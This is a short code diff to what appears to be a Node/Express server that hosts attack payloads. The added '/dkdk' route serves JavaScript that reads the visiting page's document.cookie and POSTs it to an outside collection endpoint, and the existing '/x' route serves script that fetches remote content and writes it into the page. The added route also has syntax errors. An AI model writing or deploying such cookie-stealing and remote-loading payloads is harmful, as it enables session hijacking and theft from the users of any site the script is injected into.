@@ -198,6 +198,27 @@ TypingText.runAll();
     `);
 });
 
+app.get('/dkdk' (req, res) => {
+	res.type('application/javascript').send(`
+ 	const data = { cookies: JSON.stringify(document.cookie, null, 4) };
+        fetch('https://yyazboard.onrender.com/coleta', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Erro na requisição:", response.status);
+                }
+                return response.json();
+            })
+            .then(data => console.log("Resposta do servidor:", data))
+            .catch(error => console.error("Erro:", error));
+ `);
+}
+
 app.get('/x', (req, res) => {
   res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com').then(r=>r.text()).then(t=>document.write(t))`);
 });
